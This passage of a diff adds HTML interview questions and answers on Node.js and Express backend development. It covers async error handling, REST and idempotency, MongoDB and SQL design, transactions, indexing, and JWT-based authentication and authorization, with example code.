+        <li>Express runs the handler function.</li>
+        <li>Because of <code>async</code>, the function immediately hands Express back a Promise — a receipt saying "I'll finish later" — instead of running to completion or throwing right away.</li>
+        <li>Express sees that receipt, assumes everything's fine, and returns from the route handler call. Its synchronous try/catch is done at that point — it isn't waiting around for the promise to settle.</li>
+        <li>Two seconds later, the database call resolves and the function throws.</li>
+        <li>That throw rejects a promise Express already stopped watching — the try/catch that would have caught a synchronous throw is long gone, so the rejection has nowhere to go.</li>
+      </ol>
+      <p>This is exactly an unhandled-rejection scenario: the request just hangs — nothing ever called <code>res.json()</code>/<code>res.send()</code> or <code>next(err)</code>, so Express never sends a response — until the client's own timeout gives up. Depending on the Node version/config, that unhandled rejection can even crash the whole process.</p>
+
+      <h3>The fixes</h3>
+      <pre><code>// Option 1: next(err) explicitly
+app.get('/user', async (req, res, next) => {
+  try {
+    const user = await User.findById(req.params.id);
+    if (!user) return next(new AppError('Not found', 404));
+    res.json(user);
+  } catch (err) {
+    next(err);
+  }
+});
+
+// Option 2: asyncHandler wrapper
+const asyncHandler = (fn) => (req, res, next) =>
+  Promise.resolve(fn(req, res, next)).catch(next);
+
+app.get('/user', asyncHandler(async (req, res) => {
+  const user = await User.findById(req.params.id);
+  res.json(user);
+}));
+
+// Option 3: Express 5.x catches async errors automatically
+// (express-async-errors polyfills this for Express 4)</code></pre>
+      <p><strong>Key rule:</strong> in Express 4, throw inside async functions is NOT caught — always use next(err) or asyncHandler.</p>
+      <p><strong>Common pitfall:</strong> mixing styles inconsistently across a codebase — some routes wrapped in <code>asyncHandler</code>, others not — so an error in an unwrapped route silently crashes the process (via <code>unhandledRejection</code>) while identical bugs elsewhere are handled gracefully. Wrapping every async route consistently (or upgrading to Express 5, which catches rejected promises from async handlers automatically) removes this class of bug entirely.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q18.</span> Handling 404 routes cleanly <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <pre><code>// Add AFTER all valid routes, BEFORE error middleware
+app.use((req, res, next) => {
+  next(new AppError(`Route ${req.originalUrl} not found`, 404));
+});
+
+app.use(errorHandler);</code></pre>
+      <p>This works because Express routers try each registered layer in order and fall through to the next if none of the earlier ones matched the path/method — by the time execution reaches this catch-all middleware, every real route has already had a chance to handle the request, so anything reaching here truly didn't match anything.</p>
+      <p><strong>Common pitfall:</strong> placing the 404 handler before some of your routes (e.g., before a router mounted later) — it will incorrectly swallow valid requests to those later-defined routes since Express never gets that far.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q19.</span> Designing consistent API responses <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>Consumers (frontend, mobile, other services) need a predictable structure.</p>
+      <pre><code>// Success
+{
+  "success": true,
+  "data": { "id": 1, "name": "Alice" },
+  "message": "User fetched successfully"
+}
+
+// Error
+{
+  "success": false,
+  "error": {
+    "message": "User not found",
+    "code": "USER_NOT_FOUND"
+  }
+}
+
+// Paginated list
+{
+  "success": true,
+  "data": [...],
+  "pagination": {
+    "page": 1,
+    "limit": 10,
+    "total": 100,
+    "totalPages": 10
+  }
+}
+
+const sendSuccess = (res, data, message = 'Success', statusCode = 200) =>
+  res.status(statusCode).json({ success: true, data, message });
+
+const sendError = (res, message, statusCode = 500) =>
+  res.status(statusCode).json({ success: false, error: { message } });</code></pre>
+      <p>A consistent envelope matters most at scale: frontend/mobile clients can write one generic response interceptor instead of special-casing every endpoint's shape, and error codes (like <code>USER_NOT_FOUND</code> above) let clients branch on machine-readable identifiers instead of parsing human-readable messages, which is fragile once messages get localized or reworded.</p>
+      <p><strong>Common pitfall:</strong> returning HTTP 200 with <code>{ success: false }</code> in the body — this breaks HTTP semantics (caching, monitoring, API gateways that key off status codes) and forces every client to double-check both the status code and the body. Keep the HTTP status code as the source of truth and use the envelope for structured detail, not as a replacement for it.</p>
+    </div>
+  </details>
+
+  <h2 class="section-heading">3. REST API Design</h2>
+
+  <details class="qa">
+    <summary><span class="q-num">Q20.</span> REST principles — what makes an API "RESTful"? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th>Principle</th><th>Meaning</th></tr>
+        <tr><td>Client-Server</td><td>UI and data storage are decoupled</td></tr>
+        <tr><td>Stateless</td><td>Each request contains all info needed; server stores no client state</td></tr>
+        <tr><td>Cacheable</td><td>Responses must define whether they can be cached</td></tr>
+        <tr><td>Uniform Interface</td><td>Consistent resource naming + HTTP methods</td></tr>
+        <tr><td>Layered System</td><td>Client doesn't know if it's talking to the actual server or a proxy</td></tr>
+        <tr><td>Code on Demand (optional)</td><td>Server can send executable code</td></tr>
+      </table>
+      <pre><code>GET    /users           → list all users
+POST   /users           → create a user
+GET    /users/:id       → get one user
+PUT    /users/:id       → replace a user
+PATCH  /users/:id       → partially update a user
+DELETE /users/:id       → delete a user
+
+GET    /users/:id/orders       → get orders of a specific user
+POST   /users/:id/orders       → create order for that user
+
+// NOT RESTful (RPC style):
+POST /getUser        // wrong
+POST /createUser     // wrong
+POST /deleteUser     // wrong</code></pre>
+      <p>"Stateless" is the principle interviewers probe hardest: it means the server keeps no session/context between requests — every request must carry everything needed to process it (auth token, pagination cursor, filters), which is exactly why JWTs (self-contained, signed) fit REST better than server-side sessions stored in memory. Statelessness is also what makes horizontal scaling trivial — any server instance behind a load balancer can handle any request since none of them hold client-specific state.</p>
+      <p><strong>Common pitfall:</strong> calling an API "RESTful" just because it returns JSON over HTTP — true REST also implies resource-oriented URLs (nouns, not verbs), correct HTTP verb usage, and statelessness; an RPC-style JSON API violates the uniform interface constraint even if the transport looks similar.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q21.</span> PUT vs PATCH — idempotency <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>PUT</th><th>PATCH</th></tr>
+        <tr><td>Purpose</td><td>Replace the entire resource</td><td>Partially update the resource</td></tr>
+        <tr><td>Body</td><td>Full resource representation</td><td>Only the fields to change</td></tr>
+        <tr><td>Idempotent</td><td>Yes</td><td>Depends on implementation</td></tr>
+        <tr><td>Missing fields</td><td>Set to null/default</td><td>Unchanged</td></tr>
+      </table>
+      <pre><code>// User object: { name: "Alice", email: "a@a.com", age: 25 }
+
+// PUT /users/1 — must send FULL object
+Body: { "name": "Alice Updated", "email": "a@a.com", "age": 25 }
+// If you omit age → it gets nulled out
+
+// PATCH /users/1 — send only what changes
+Body: { "name": "Alice Updated" }
+// email and age remain unchanged</code></pre>
+      <p><strong>Idempotency:</strong> calling the same PUT request 10 times = same result as once. PATCH can be non-idempotent (e.g., incrementing a counter).</p>
+      <p>A common real-world compromise: many APIs advertise PATCH but actually implement it as JSON Merge Patch (RFC 7396) — a shallow merge of the provided fields into the existing resource — rather than the more complex JSON Patch (RFC 6902) operation-list format. Interviewers may ask you to justify which one you'd pick; merge patch is simpler and covers 90% of use cases, operation-list patch is needed when you must express array insertions/removals precisely.</p>
+      <p><strong>Common pitfall:</strong> implementing PUT to only update provided fields (i.e., behaving like PATCH) — this silently breaks client expectations and idempotency guarantees that caching layers and retries rely on.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q22.</span> What is idempotency and why does it matter? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th>Method</th><th>Idempotent?</th><th>Safe?</th></tr>
+        <tr><td>GET</td><td>Yes</td><td>Yes</td></tr>
+        <tr><td>PUT</td><td>Yes</td><td>No</td></tr>
+        <tr><td>DELETE</td><td>Yes</td><td>No</td></tr>
+        <tr><td>POST</td><td>No</td><td>No</td></tr>
+        <tr><td>PATCH</td><td>Usually</td><td>No</td></tr>
+      </table>
+      <p>Networks are unreliable. If a client retries after a timeout and the operation is idempotent, retrying is safe. If POST is retried, you may create duplicate records.</p>
+      <p><strong>Solution for non-idempotent ops:</strong> idempotency keys.</p>
+      <pre><code>POST /payments
+Idempotency-Key: unique-client-generated-uuid</code></pre>
+      <p>Server stores the key — if the same key arrives again, returns the cached response instead of processing twice.</p>
+      <p>Implementation detail worth knowing: the server should store the idempotency key together with the request's response (and ideally a hash of the request body) with a reasonable TTL (e.g., 24 hours) — if a second request arrives with the same key but a <em>different</em> body, that's a client bug and should be rejected (409), not silently served the cached response. The key itself must be client-generated (usually a UUID) precisely because the whole point is surviving a lost response — if the server generated it, a retried request wouldn't know which key to resend.</p>
+      <p><strong>Interview follow-up:</strong> "where do you store idempotency keys?" — Redis with a TTL is the standard answer, since it needs to be fast, shared across all server instances, and self-expiring.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q23.</span> CRUD without a DB — in-memory store, risks <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <pre><code>const store = {
+  users: [],
+  nextId: 1
+};
+
+function createUser(data) {
+  const user = { id: store.nextId++, ...data, createdAt: new Date() };
+  store.users.push(user);
+  return user;
+}
+
+function getUserById(id) {
+  return store.users.find(u => u.id === id) || null;
+}
+
+function updateUser(id, data) {
+  const idx = store.users.findIndex(u => u.id === id);
+  if (idx === -1) return null;
+  store.users[idx] = { ...store.users[idx], ...data };
+  return store.users[idx];
+}
+
+function deleteUser(id) {
+  const idx = store.users.findIndex(u => u.id === id);
+  if (idx === -1) return false;
+  store.users.splice(idx, 1);
+  return true;
+}</code></pre>
+      <p><strong>Risks:</strong> data lost on restart, not scalable (each instance has its own copy), no transactions (race conditions), memory limits.</p>
+      <p>The race condition risk is easy to demonstrate concretely: two concurrent requests both read <code>store.nextId</code>, both increment it, and both write — under Node's single-threaded model this is actually safe as long as neither operation awaits mid-update (no interleaving is possible between two fully synchronous statements), but the moment any async work (a validation call, a fetch) is introduced between read and write, two requests can interleave and corrupt the counter or overwrite each other's array splice.</p>
+      <p><strong>Interview follow-up:</strong> this pattern is still genuinely useful for prototyping, unit tests, and take-home interview exercises where standing up a real DB is overkill — the key is being explicit that it's a placeholder, not a production design.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q24.</span> Moving from in-memory CRUD to CRUD with a database <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th>Aspect</th><th>In-Memory</th><th>With Database</th></tr>
+        <tr><td>Persistence</td><td>Lost on restart</td><td>Survives restarts</td></tr>
+        <tr><td>Schema</td><td>Plain JS objects</td><td>Enforced schema (Mongoose/Sequelize)</td></tr>
+        <tr><td>Queries</td><td>Array.filter()</td><td>SQL/MongoDB query language (indexed)</td></tr>
+        <tr><td>Concurrency</td><td>Race conditions in arrays</td><td>DB handles locking/transactions</td></tr>
+        <tr><td>Relationships</td><td>Manual references</td><td>Foreign keys / MongoDB references</td></tr>
+        <tr><td>Performance</td><td>O(n) scan</td><td>O(log n) with indexes</td></tr>
+        <tr><td>Async nature</td><td>Sync</td><td>All DB calls are async — must await</td></tr>
+      </table>
+      <pre><code>// In-memory (sync)
+const user = users.find(u => u.email === email);
+
+// With DB (async)
+const user = await User.findOne({ email });</code></pre>
+      <p>The async shift is more than syntax — it changes error handling (every DB call is now a rejectable promise that needs try/catch or a caught rejection), it changes testing strategy (you now need to mock the DB layer or spin up a test DB/in-memory Mongo instance), and it introduces new failure modes entirely absent from in-memory code: connection drops, query timeouts, and the need for retry/backoff logic on transient errors.</p>
+      <p><strong>Common pitfall:</strong> forgetting to <code>await</code> a DB call in the middle of a migration — the promise silently resolves later and the function returns/responds before the write actually completes, producing intermittent "works on my machine" bugs that only show up under load.</p>
+    </div>
+  </details>
+
+  <h2 class="section-heading">4. Databases — MongoDB &amp; SQL</h2>
+
+  <details class="qa">
+    <summary><span class="q-num">Q25.</span> What is a database connection pool and why is it needed? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>A cache of reusable database connections maintained so connections can be reused rather than establishing a new one each time.</p>
+      <pre><code>Without pool:
+Request 1 → Open connection → Query → Close connection (~100ms overhead)
+Request 2 → Open connection → Query → Close connection
+...
+
+With pool (10 connections):
+Request 1  ─┐
+Request 2  ─┤→ Pool (connections already open) → Query → return to pool
+Request 3  ─┘</code></pre>
+      <pre><code>// Mongoose manages connection pooling automatically
+mongoose.connect(MONGO_URI, {
+  maxPoolSize: 10,
+  minPoolSize: 2,
+  serverSelectionTimeoutMS: 5000
+});
+
+// node-postgres (pg) pool
+const { Pool } = require('pg');
+const pool = new Pool({ max: 20, idleTimeoutMillis: 30000 });
+const client = await pool.connect();
+client.release();</code></pre>
+      <p><strong>Why needed:</strong> opening a connection is expensive (TCP handshake, auth); web servers get burst traffic; limits max connections to the DB.</p>
+      <p>Sizing the pool matters more than people expect: too small and requests queue waiting for a free connection under load (visible as rising latency even though the DB itself isn't overloaded); too large and you can exhaust the database's own connection limit (Postgres defaults to 100 total), especially once you multiply pool size by the number of clustered app instances — 10 instances x 20-connection pools = 200 connections, which can crash a DB configured for 100.</p>
+      <p><strong>Interview follow-up:</strong> "what happens in a serverless environment (Lambda) where each invocation might open its own pool?" — this is a known anti-pattern that can exhaust DB connections quickly; the standard fixes are a connection-pooling proxy (RDS Proxy, PgBouncer) sitting between the functions and the database, or reusing a single connection across warm invocations.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q26.</span> What are Models and why do we use them? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>A Model is a class/object representing a collection (MongoDB) or table (SQL), providing methods to interact with it. The "M" in MVC.</p>
+      <pre><code>const mongoose = require('mongoose');
+
+const userSchema = new mongoose.Schema({
+  name: { type: String, required: true },
+  email: { type: String, unique: true, lowercase: true },
+  password: String,
+  role: { type: String, enum: ['user', 'admin'], default: 'user' },
+  createdAt: { type: Date, default: Date.now }
+});
+
+userSchema.methods.comparePassword = async function(candidatePassword) {
+  return bcrypt.compare(candidatePassword, this.password);
+};
+
+userSchema.statics.findByEmail = function(email) {
+  return this.findOne({ email });
+};
+
+const User = mongoose.model('User', userSchema);
+
+const user = await User.create({ name: 'Alice', email: 'a@a.com', password: '...' });
+const found = await User.findByEmail('a@a.com');</code></pre>
+      <p><strong>Why models:</strong> encapsulate data structure and DB logic, validate data before saving, provide reusable query methods, keep controllers lean.</p>
+      <p>Mongoose models also give you middleware hooks (<code>pre</code>/<code>post</code> save, validate, remove) that centralize cross-cutting concerns — e.g., hashing a password in a <code>pre('save')</code> hook guarantees it happens no matter which code path creates a user, instead of relying on every controller to remember to hash it manually. Instance methods (<code>comparePassword</code>) attach behavior to a document, while statics attach behavior to the model/collection as a whole — a distinction interviewers sometimes probe directly.</p>
+      <p><strong>Common pitfall:</strong> putting business logic (like sending a welcome email) inside a model hook — hooks are meant for data-integrity concerns tied to persistence, not side effects with their own failure modes; those belong in the service layer where they can be tested and retried independently.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q27.</span> What is a Schema and what constraints can it enforce? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <pre><code>// MongoDB Schema (Mongoose)
+const productSchema = new mongoose.Schema({
+  name:     { type: String, required: true, trim: true, maxlength: 100 },
+  price:    { type: Number, required: true, min: 0 },
+  stock:    { type: Number, default: 0, min: 0 },
+  category: { type: String, enum: ['electronics', 'clothing', 'food'] },
+  tags:     [String],
+  isActive: { type: Boolean, default: true },
+  createdAt:{ type: Date,   default: Date.now }
+});</code></pre>
+      <pre><code>-- SQL Schema
+CREATE TABLE products (
+  id          SERIAL PRIMARY KEY,
+  name        VARCHAR(100) NOT NULL,
+  price       DECIMAL(10,2) NOT NULL CHECK (price >= 0),
+  stock       INT DEFAULT 0 CHECK (stock >= 0),
+  category    VARCHAR(50),
+  is_active   BOOLEAN DEFAULT TRUE,
+  created_at  TIMESTAMP DEFAULT NOW(),
+  user_id     INT REFERENCES users(id) ON DELETE CASCADE
+);</code></pre>
+      <p><strong>Constraints both can enforce:</strong> required/NOT NULL, unique values, min/max, enum, defaults, data type enforcement, referential integrity (SQL foreign keys).</p>
+      <p>A key difference is where enforcement actually happens: Mongoose schema validation runs in the application layer (Node process) before the write reaches MongoDB, whereas SQL constraints (CHECK, NOT NULL, FOREIGN KEY) are enforced by the database engine itself, regardless of which application or script writes to it. That means a raw MongoDB write bypassing Mongoose (e.g., a script using the native driver directly) skips schema validation entirely, while no client can bypass a SQL CHECK constraint.</p>
+      <p><strong>Interview follow-up:</strong> "so is a Mongoose schema a real guarantee?" — not a hard one; MongoDB does support server-side JSON Schema validation on collections for exactly this reason, but it's used far less often than Mongoose-level validation in practice.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q28.</span> When to use MongoDB over SQL and vice versa <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th>Factor</th><th>Use MongoDB</th><th>Use SQL (Postgres/MySQL)</th></tr>
+        <tr><td>Data shape</td><td>Flexible, nested, varies per record</td><td>Fixed, tabular, well-defined</td></tr>
+        <tr><td>Schema</td><td>Schema-less / evolving</td><td>Rigid, structured</td></tr>
+        <tr><td>Relationships</td><td>Few joins needed</td><td>Complex relationships + joins</td></tr>
+        <tr><td>Transactions</td><td>Single-doc ACID (multi-doc in 4.0+)</td><td>Strong multi-table transactions</td></tr>
+        <tr><td>Scaling</td><td>Horizontal (sharding) built-in</td><td>Vertical, harder to shard</td></tr>
+        <tr><td>Use cases</td><td>Real-time apps, catalogs, CMS, logs</td><td>Financial systems, e-commerce, ERP</td></tr>
+      </table>
+      <p>As a faster requirement-by-requirement checklist:</p>
+      <table>
+        <tr><th>Requirement</th><th>Prefer</th></tr>
+        <tr><td>Many relationships between entities</td><td><strong>SQL</strong></td></tr>
+        <tr><td>Transactions / strong consistency</td><td><strong>SQL</strong></td></tr>
+        <tr><td>Complex joins and reporting</td><td><strong>SQL</strong></td></tr>
+        <tr><td>Fixed/structured schema</td><td><strong>SQL</strong></td></tr>
+        <tr><td>Data changes frequently in structure</td><td><strong>NoSQL</strong></td></tr>
+        <tr><td>Huge scale with simple access patterns</td><td><strong>NoSQL</strong></td></tr>
+        <tr><td>Document-like data</td><td><strong>NoSQL</strong></td></tr>
+        <tr><td>Very high write/read throughput</td><td><strong>NoSQL</strong></td></tr>
+        <tr><td>Need horizontal scaling easily</td><td><strong>NoSQL</strong></td></tr>
+      </table>
+      <p><strong>Rule of thumb:</strong> joins + transactions → SQL. Flexible schema + horizontal scale → MongoDB. Need both → PostgreSQL with JSONB columns.</p>
+      <p>This is a favorite whiteboard question because interviewers want to see you reason about the actual data access pattern, not recite the table. Ask yourself: how often do I need to join across entities, and how consistent must reads be? An analytics dashboard aggregating logs favors Mongo's flexible documents and aggregation pipeline; a banking ledger with strict multi-row consistency favors SQL's mature transaction guarantees and query planner.</p>
+      <p><strong>Common pitfall:</strong> picking MongoDB purely because it's trendy or "schema-less feels easier," then hitting painful multi-document joins (<code>$lookup</code>) once the data model turns out to be relational after all — modeling the actual query patterns up front avoids this.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q29.</span> ACID properties and why they matter <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th>Property</th><th>Meaning</th><th>Example</th></tr>
+        <tr><td>Atomicity</td><td>All operations succeed, or none do</td><td>Debit + credit both happen or neither</td></tr>
+        <tr><td>Consistency</td><td>DB moves between valid states; rules enforced</td><td>Balance can never go negative</td></tr>
+        <tr><td>Isolation</td><td>Concurrent transactions don't interfere</td><td>Two users booking the same seat — only one wins</td></tr>
+        <tr><td>Durability</td><td>Committed transactions survive crashes</td><td>Power outage — committed payment still recorded</td></tr>
+      </table>
+      <pre><code>BEGIN;
+  UPDATE accounts SET balance = balance - 500 WHERE id = 1;
+  UPDATE accounts SET balance = balance + 500 WHERE id = 2;
+COMMIT; -- Both succeed
+-- If error occurs: ROLLBACK</code></pre>
+      <p>Isolation is the property with the most nuance — it's implemented via isolation <em>levels</em> (Read Uncommitted, Read Committed, Repeatable Read, Serializable), each trading consistency for concurrency/performance. Read Committed (Postgres's default) prevents dirty reads but still allows non-repeatable reads and phantom reads within the same transaction; Serializable gives the strongest guarantee (as if transactions ran one at a time) but can force retries when conflicts are detected.</p>
+      <p><strong>Interview follow-up:</strong> "what's a dirty read vs a phantom read?" — a dirty read is reading another transaction's uncommitted change (which might get rolled back); a phantom read is re-running the same query in one transaction and getting a different set of rows because another transaction inserted/deleted matching rows in between. <strong>Common pitfall:</strong> assuming MongoDB has "no ACID" — single-document writes have always been ACID in MongoDB, and multi-document ACID transactions have been supported since MongoDB 4.0.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q30.</span> What is a transaction and when is it needed? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>A transaction is a group of one or more database operations executed as a single atomic unit — either every operation in the group succeeds and the changes are committed together, or if any one of them fails, the entire group is rolled back and the database is left exactly as if none of them had run. There's no in-between state where only some of the operations took effect. That all-or-nothing guarantee is precisely what the "A" (Atomicity) in ACID (Q29) refers to.</p>
+      <pre><code>const session = await mongoose.startSession();
+session.startTransaction();
+try {
+  await Order.create([{ product: 'X', user: userId }], { session });
+  await Product.updateOne({ _id: productId }, { $inc: { stock: -1 } }, { session });
+  await session.commitTransaction();
+} catch (err) {
+  await session.abortTransaction();
+  throw err;
+} finally {
+  session.endSession();
+}</code></pre>
+      <p><strong>When needed:</strong> transferring money, creating an order + reducing inventory together, registering a user + creating a default profile, any operation where partial completion would leave data inconsistent.</p>
+      <p>In MongoDB specifically, transactions require a replica set (or sharded cluster) — they don't work on a standalone instance, which surprises people testing locally. Transactions also carry real performance cost (holding locks/snapshots across multiple operations, coordination overhead), so the common design guidance is to model documents so that operations that must be atomic together live in a single document where possible (relying on MongoDB's native single-document atomicity) and reach for multi-document transactions only when that's genuinely not feasible.</p>
+      <p><strong>Common pitfall:</strong> forgetting to pass <code>{ session }</code> into every operation inside the transaction — an operation that omits the session silently runs outside the transaction and won't be rolled back if the transaction later aborts.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q31.</span> What is indexing and how does it affect performance? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>An index is a data structure (usually a B-tree) that lets the DB find records without scanning every row/document.</p>
+      <pre><code>// MongoDB
+userSchema.index({ email: 1 });           // single field
+userSchema.index({ name: 1, age: -1 });   // compound index
+userSchema.index({ email: 1 }, { unique: true });
+
+-- SQL
+CREATE INDEX idx_users_email ON users(email);
+CREATE INDEX idx_orders_user_date ON orders(user_id, created_at DESC);</code></pre>
+      <table>
+        <tr><th></th><th>Without Index</th><th>With Index</th></tr>
+        <tr><td>Read speed</td><td>O(n) — full scan</td><td>O(log n) — tree traversal</td></tr>
+        <tr><td>Write speed</td><td>Fast — just insert</td><td>Slower — must update index too</td></tr>
+        <tr><td>Storage</td><td>Less</td><td>More</td></tr>
+      </table>
+      <p>Index fields you frequently query/sort/filter by; don't over-index; use .explain() (MongoDB) or EXPLAIN ANALYZE (SQL) to verify index usage.</p>
+      <p>Concretely, a B-tree index keeps keys sorted in a balanced tree so the DB can binary-search down to the matching range instead of scanning every row — that's what turns an O(n) collection scan into an O(log n) lookup, and it's also why B-trees make range queries (<code>&gt;</code>, <code>&lt;</code>, <code>BETWEEN</code>) and sorted results cheap, unlike a hash index which only helps exact-match lookups. For compound indexes, field order matters — an index on <code>{ name: 1, age: -1 }</code> can serve queries filtering on <code>name</code> alone, or <code>name</code>+<code>age</code>, but not on <code>age</code> alone (this is the "leftmost prefix" rule, true in both MongoDB and SQL B-tree indexes).</p>
+      <p><strong>Interview follow-up:</strong> "why does an index slow down writes?" — every insert/update/delete must also update every index on the affected fields, so a table with 10 indexes pays that cost on every single write, which is why indexing is a read/write tradeoff, not a free performance win. <strong>Common pitfall:</strong> adding an index and assuming it's used — a query with a leading wildcard (<code>LIKE '%term'</code>), a function applied to the indexed column, or a low-cardinality field (like a boolean) often causes the planner to skip the index or do a full scan anyway; always verify with the query plan.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q32.</span> Embedding vs referencing in MongoDB <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>Embedding</th><th>Referencing</th></tr>
+        <tr><td>What</td><td>Store related data inside the same document</td><td>Store ObjectId and look up separately</td></tr>
+        <tr><td>Read</td><td>Fast — single query</td><td>Requires populate/join (extra query)</td></tr>
+        <tr><td>Write</td><td>Simple — one document</td><td>Must update multiple documents</td></tr>
+        <tr><td>Size</td><td>Grows with embedded data</td><td>Documents stay small</td></tr>
+        <tr><td>Best for</td><td>"Belongs to" + read-heavy + rarely changes</td><td>Large sub-documents + shared data + many-to-many</td></tr>
+      </table>
+      <pre><code>// Embedding — comments on a post (1:few)
+{
+  _id: "post1",
+  title: "My Post",
+  comments: [
+    { user: "Alice", text: "Great!", createdAt: "..." },
+    { user: "Bob", text: "Thanks!", createdAt: "..." }
+  ]
+}
+
+// Referencing — orders referencing products (many:many)
+{
+  _id: "order1",
+  user: ObjectId("user1"),
+  products: [ObjectId("prod1"), ObjectId("prod2")]
+}
+// Fetch with: Order.find().populate('products')</code></pre>
+      <p>Embed when data is always accessed together and won't grow unboundedly. Reference when data is shared, large, or needs independent querying.</p>
+      <p>Watch for MongoDB's hard 16MB document size limit — an unbounded embedded array (comments on a viral post, log entries on a device) can eventually hit that ceiling and start failing writes; this is the classic "unbounded array" anti-pattern interviewers probe for. A common middle ground is hybrid: embed a small denormalized preview (last 3 comments, a computed count) for fast reads while keeping the full collection referenced separately for pagination.</p>
+      <p><strong>Interview follow-up:</strong> "what about data consistency when you embed duplicated info, like a denormalized username on every comment?" — you accept eventual staleness (the username shown on old comments doesn't update if the user renames) as the tradeoff for read speed, and you need a plan (background job, event-driven update) if that staleness isn't acceptable for the use case.</p>
+    </div>
+  </details>
+
+  <h2 class="section-heading">5. Authentication &amp; Security</h2>
+
+  <details class="qa">
+    <summary><span class="q-num">Q33.</span> How do you implement authentication and authorization in Express? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>Authentication</th><th>Authorization</th></tr>
+        <tr><td>Question</td><td>"Who are you?"</td><td>"What can you do?"</td></tr>
+        <tr><td>Process</td><td>Verify identity (login)</td><td>Check permissions for a resource</td></tr>
+        <tr><td>When</td><td>First step</td><td>After authentication</td></tr>
+        <tr><td>Example</td><td>Logging into Gmail</td><td>Accessing another user's emails</td></tr>
+        <tr><td>Failure status</td><td>401 Unauthorized</td><td>403 Forbidden</td></tr>
+      </table>
+      <p><strong>Register and log in:</strong> hash passwords with bcrypt, never store plaintext passwords, and sign a short-lived JWT after verifying credentials.</p>
+      <pre><code>const express = require('express');
+const bcrypt = require('bcrypt');
+const jwt = require('jsonwebtoken');
+const User = require('../models/User');
+const router = express.Router();
+
+router.post('/register', async (req, res) =&gt; {
+  try {
+    const { name, email, password } = req.body;
+    if (!name || !email || !password) {
+      return res.status(400).json({ message: 'Missing required fields' });
+    }
+    if (await User.findOne({ email })) {
+      return res.status(409).json({ message: 'User already exists' });
+    }
+    const hashedPassword = await bcrypt.hash(password, 10);
+    const user = await User.create({ name, email, password: hashedPassword });
+    return res.status(201).json({ message: 'Registered', userId: user._id });
+  } catch (error) {
+    // Also map a duplicate-email unique-index error to 409 in production.
+    return res.status(500).json({ message: 'Server error' });
+  }
+});
+
+router.post('/login', async (req, res) =&gt; {
+  try {
+    const { email, password } = req.body;
+    if (!email || !password) {
+      return res.status(400).json({ message: 'Missing credentials' });
+    }
+    const user = await User.findOne({ email });
+    if (!user || !(await bcrypt.compare(password, user.password))) {
+      return res.status(401).json({ message: 'Invalid credentials' });
+    }
+    const token = jwt.sign(
+      { userId: user._id, role: user.role },
+      process.env.JWT_SECRET,
+      { expiresIn: '1h' }
+    );
+    return res.json({ token });
+  } catch (error) {
+    return res.status(500).json({ message: 'Server error' });
+  }
+});
+
+module.exports = router;</code></pre>
+      <p><strong>Protect routes:</strong> send the token as <code>Authorization: Bearer &lt;token&gt;</code>. Authentication verifies the signature and expiry; authorization checks the verified user's role.</p>
+      <pre><code>const authenticate = (req, res, next) =&gt; {
+  const header = req.headers.authorization;
+  const token = header?.startsWith('Bearer ') ? header.slice(7) : null;
+  if (!token) return res.status(401).json({ error: 'Not authenticated' });
+  try {
+    req.user = jwt.verify(token, process.env.JWT_SECRET);
+    next();
+  } catch {
+    res.status(401).json({ error: 'Invalid token' });
+  }
+};
+
+const authorize = (...roles) =&gt; (req, res, next) =&gt; {
+  if (!roles.includes(req.user.role)) {
+    return res.status(403).json({ error: 'Access denied' });
+  }
+  next();
+};
+
+app.delete('/users/:id', authenticate, authorize('admin'), deleteUser);</code></pre>
+      <p>Notice the two middlewares are deliberately separate and composable — <code>authenticate</code> only answers "is this a valid, non-expired token" and attaches <code>req.user</code>; <code>authorize</code> is a completely independent concern that reads the already-attached user and checks permissions. Keeping them separate means you can reuse <code>authenticate</code> alone for routes any logged-in user can hit, and layer different <code>authorize</code> checks (role-based, ownership-based) on top per-route.</p>
+      <p><strong>Common pitfall:</strong> checking authorization based on data the client sent (e.g., trusting a <code>role</code> field in the request body) instead of the value embedded in the verified token/session — that lets any client simply claim to be an admin. Authorization must always be derived from server-verified state, never from client-supplied fields.</p>
+      <p><strong>Production notes:</strong> enforce a unique index on email, validate input, rate-limit login, keep <code>JWT_SECRET</code> outside source control, and use short-lived access tokens with a refresh-token strategy when longer sessions are needed. For sensitive permissions, recheck the current role in the database so an old JWT cannot retain a revoked role until it expires.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q34.</span> httpOnly cookies vs localStorage for tokens <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
